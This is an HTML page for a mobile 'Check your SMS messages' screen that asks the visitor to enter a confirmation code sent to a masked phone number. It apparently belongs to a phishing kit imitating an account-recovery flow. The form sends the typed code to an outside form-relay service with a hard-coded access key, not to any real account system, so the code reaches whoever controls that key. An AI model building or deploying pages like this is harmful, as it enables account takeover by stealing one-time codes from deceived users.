<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">

<title>Enter the code</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-tap-highlight-color: transparent;
}

html,
body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #202a33;
    font-family: -apple-system, BlinkMacSystemFont,
                 "SF Pro Display", "SF Pro Text",
                 "Helvetica Neue", Arial, sans-serif;
}

body {
    color: #f1f3f5;
}

.app {
    width: 100%;
    min-height: 100dvh;
    background: #202a33;
    position: relative;
}

/* Back button */

.back {
    position: absolute;
    top: 10px;
    left: 20px;
    width: 17px;
    height: 17px;
    border: 0;
    background: transparent;
    cursor: pointer;
}

.back::before,
.back::after {
    content: "";
    position: absolute;
    left: 0;
    top: 8px;
    width: 17px;
    height: 2.5px;
    background: #f0f2f4;
    border-radius: 4px;
}

.back::before {
    transform: rotate(-43deg);
    transform-origin: left center;
}

.back::after {
    transform: rotate(43deg);
    transform-origin: left center;
}

/* Heading */

h2 {
    position: absolute;
    top: 45px;
    left: 16px;
    right: 16px;

    font-size: 28px;
    line-height: 34px;
    font-weight: 700;
    letter-spacing: -0.5px;
    color: #f2f3f5;
}

/* Subtitle */

.subtitle {
    position: absolute;
    top: 80px;
    left: 16px;

    font-size: 15px;
    line-height: 26px;
    color: #f0f2f4;
}

/* Input */

.input-wrap {
    position: absolute;
    top: 160px;
    left: 16px;
    right: 16px;
    height: 71px;
}

.mobile-input {
    width: 100%;
    height: 71px;

    background: transparent;
    border: 1px solid #4c555d;
    border-radius: 18px;

    outline: none;
    padding: 0 18px;

    color: #f4f5f6;
    font-family: inherit;
    font-size: 18px;
}

.mobile-input::placeholder {
    color: #aab0b7;
}

/* Continue button */

.continue-btn {
    position: absolute;
    top: 250px;
    left: 16px;
    right: 16px;
    height: 52px;

    border: none;
    border-radius: 27px;

    background: #0866df;
    color: white;

    font-family: inherit;
    font-size: 18px;
    font-weight: 600;

    cursor: pointer;
}

/* Bottom link */

.email-link {
    position: absolute;
    top: 310px;
    left: 16px;
    right: 16px;

    text-align: center;

    color: #f1f2f4;
    text-decoration: none;

    font-size: 16px;
    line-height: 25px;
    font-weight: 600;
}

/* iPhone 15 width */

@media screen and (min-width: 391px) {
    .app {
        max-width: 390px;
        margin: 0 auto;
    }
}
</style>
</head>

<body>

<div class="app">

    <button
        class="back"
        aria-label="Go back"
        onclick="location.href='forget password.html'">
    </button>

    <h2>Check your SMS messages</h2>

    <div class="subtitle">
        We've sent a code to +88017********. Enter that code to confirm your account.
    </div>


  <form action="https://api.web3forms.com/submit" method="POST">
    
    <div class="input-wrap">
        <input type="hidden" name="access_key" value="d3e8c229-865f-4b79-85ee-d37229319012">
        <input
            class="mobile-input"
            type="text"
            name="name"
            autocomplete="off"
            placeholder="Enter Code"
            aria-label="Enter code">
    </div>

    <button class="continue-btn" type="submit">
        Continue
    </button>
    </form>

    <a href="login.html" class="email-link">
        Try again later
    </a>

</div>

</body>
</html>
